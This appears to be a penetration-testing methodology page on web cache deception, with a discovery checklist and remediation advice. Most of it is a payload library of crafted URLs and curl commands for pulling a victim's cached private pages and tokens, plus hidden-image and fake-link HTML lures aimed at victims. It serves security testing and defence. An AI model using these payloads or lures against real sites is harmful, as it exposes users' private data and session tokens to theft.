---
title: "Web Cache Deception"
date: 2026-02-24
draft: false
---

# Web Cache Deception

> **Severity**: High | **CWE**: CWE-200, CWE-346
> **OWASP**: A01:2021 – Broken Access Control

---

## What Is Web Cache Deception?

Unlike cache poisoning (attacker poisons cache to affect other users), **cache deception** tricks the cache into storing a **victim's private, authenticated response** as a public, cacheable resource — then the attacker retrieves it.

```
Normal: GET /account/profile → private, authenticated → Cache-Control: no-store
Trick:  GET /account/profile.css → server ignores .css, serves profile page
        CDN caches because .css extension → marked as static asset
Attacker: GET /account/profile.css → CDN returns cached victim profile
```

**Key requirement**: path routing that ignores the appended path/extension, combined with a cache that uses file-extension-based caching rules.

---

## Discovery Checklist

- [ ] Identify authenticated endpoints with personal data: `/account/profile`, `/api/user/me`
- [ ] Test: append static extension → does server still return same dynamic content?
  - `/account/profile.css` → still shows profile?
  - `/account/profile.js` → still shows profile?
  - `/account/profile.png` → still shows profile?
- [ ] Check response `Cache-Control` header on the appended path
- [ ] Check `X-Cache`, `CF-Cache-Status`, `Age` on second request (confirm caching)
- [ ] Test with path separators: `/account/profile/test.css`, `/account/profile;test.css`
- [ ] Test URL-encoded variants: `/account/profile%2ftest.css`
- [ ] Test query-string based cache extension: `/account/profile?x=y.css` (some caches key on extensions in query)
- [ ] Test in logged-out state after poisoning — can you get another user's data?

---

## Payload Library

### Attack 1 — Basic Cache Deception

```bash
# Step 1: Log in as victim (or wait for victim to be tricked)
# Step 2: Victim visits attacker-crafted URL:
https://target.com/account/profile.css
https://target.com/account/profile.js
https://target.com/account/profile/style.css
https://target.com/account/settings.png

# Server interprets path as /account/profile (strips extension or ignores it)
# CDN/cache caches it as a static resource (because .css extension)

# Step 3: Attacker (unauthenticated) retrieves:
curl -s https://target.com/account/profile.css
# → Gets victim's profile page from cache

# Verify caching:
curl -sI https://target.com/account/profile.css | grep -i "x-cache\|age\|cf-cache"
# Second request: X-Cache: HIT → victim's data cached
```

### Attack 2 — Path Separator Variants

```bash
# Semicolon-based (Express, Ruby, PHP):
https://target.com/account/profile;random.css
https://target.com/api/user/me;v=1.js
# Server routes to /account/profile, cache sees .css

# Slash + fake path:
https://target.com/account/profile/nonexistent.css
https://target.com/account/profile/../../account/profile.css

# Null byte (historic):
https://target.com/account/profile%00.css

# Query string extension:
https://target.com/account/profile?random.css
https://target.com/account/profile?x=1.js
# Some caches parse extension from query string parameters
```

### Attack 3 — Trick Victim into Visiting URL

```html
<!-- Attacker page or email — victim clicks to "download their profile CSS" -->
<img src="https://target.com/account/profile.css" width="0" height="0">

<!-- Img src is loaded by browser with victim's session cookie -->
<!-- Response cached on CDN → attacker can now retrieve it -->

<!-- More convincing victim click: -->
<a href="https://target.com/account/profile.css">
  Download your profile data
</a>

<!-- Or: redirect victim via open redirect: -->
<meta http-equiv="refresh"
  content="0;url=https://target.com/redirect?url=/account/profile.css">
```

### Attack 4 — API Endpoint Deception

```bash
# REST APIs often return JSON — still vulnerable:
https://target.com/api/v1/user/me.json
https://target.com/api/v1/user/me/data.json
https://target.com/api/user/profile/photo.jpg  # returns JSON despite extension

# If CDN caches .json extension aggressively:
curl -s https://target.com/api/v1/user/me.json \
  -H "Authorization: Bearer VICTIM_TOKEN"
# → Response cached

# Then unauthenticated:
curl -s https://target.com/api/v1/user/me.json
# → Gets victim's JSON data

# JWT/token in response:
# If /api/me.json returns {"token": "..."} → token cached → stolen
```

### Attack 5 — Framework-Specific Path Handling

```bash
# Rails: routes ignore extensions by default in older versions
# /account/profile.css → routes to ProfilesController#show → same as /account/profile

# Django: URL patterns often don't account for extension trickery
# /account/profile.css → no URL match → falls through to catch-all? Test it.

# Spring Boot: Actuator endpoints
# /actuator/health.css → if routed to /actuator/health

# Laravel: route model binding ignores extension
# /user/1.css → UserController@show($id=1)

# PHP: mod_rewrite may strip extension before passing to PHP
# /account/profile.css → mod_rewrite → /account/profile → profile.php
```

---

## Tools

```bash
# Web Cache Vulnerability Scanner (also covers deception):
go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest
web-cache-vulnerability-scanner -u https://target.com/account/profile

# Manual workflow:
# 1. Authenticate and visit:
curl -s "https://target.com/account/profile.css" \
  -b "session=VICTIM_SESSION" \
  -H "Cache-Control: no-cache"

# 2. Check if response is personal data:
# Response should show profile information

# 3. Second request (no auth) — is it cached?
curl -sI "https://target.com/account/profile.css"
# X-Cache: HIT → poisoned
curl -s "https://target.com/account/profile.css"
# → victim data without auth

# Extensions to try automatically:
for ext in css js png jpg gif ico woff woff2 ttf eot svg; do
  status=$(curl -so /dev/null -w "%{http_code}" \
    "https://target.com/account/profile.$ext" \
    -b "session=YOUR_SESSION")
  echo "$ext: $status"
done

# Detect which paths contain sensitive data before extension testing:
# Check /account/*, /api/user/*, /profile/*, /settings/*
```

---

## Remediation Reference

- **Explicit `Cache-Control: no-store, private`** on all authenticated/dynamic responses — regardless of URL path or extension
- **Cache by path + authentication status**: CDN/proxy should distinguish authenticated vs public responses
- **Do not let file extension determine cache policy** for application routes
- **Path normalization**: strip or normalize path extensions at the application router before routing
- **CDN configuration**: explicit allowlist of cacheable paths — default to no-cache for application routes
- **Test after CDN config changes**: verify that private pages are not cached with automated regression tests

*Part of the Web Application Penetration Testing Methodology series.*
